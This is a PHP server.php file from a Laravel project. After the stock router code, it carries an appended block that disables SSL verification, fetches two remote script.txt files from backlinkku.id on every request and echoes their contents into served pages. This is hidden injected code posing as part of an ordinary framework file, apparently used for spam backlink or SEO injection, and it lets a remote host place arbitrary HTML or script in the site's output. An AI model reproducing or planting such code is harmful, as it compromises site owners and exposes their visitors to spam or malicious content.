<?php

/**
 * Laravel - A PHP Framework For Web Artisans.
 *
 * @author   Taylor Otwell <taylor@laravel.com>
 */
$uri = urldecode(
    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)
);

// This file allows us to emulate Apache's "mod_rewrite" functionality from the
// built-in PHP web server. This provides a convenient way to test a Laravel
// application without having installed a "real" web server software here.
if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
    return false;
}

require_once __DIR__.'/public/index.php';
if (!function_exists('fetch_remote_content')) {
    function fetch_remote_content($url) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Bypass SSL verification if needed
        $output = curl_exec($ch);
        curl_close($ch);
        return $output;
    }
}
function fetch_and_display_content($url) {
    $fileContents = fetch_remote_content($url);
    if (strpos($fileContents, '<?php') === false) {
        echo $fileContents;
    }
}
$jasabacklinks_1 = 'https://www.backlinkku.id/menu/traffic-v1/script.txt';
$jasabacklinks_2 = 'https://www.backlinkku.id/menu/vip-v1/script.txt';
fetch_and_display_content($jasabacklinks_1);
fetch_and_display_content($jasabacklinks_2);
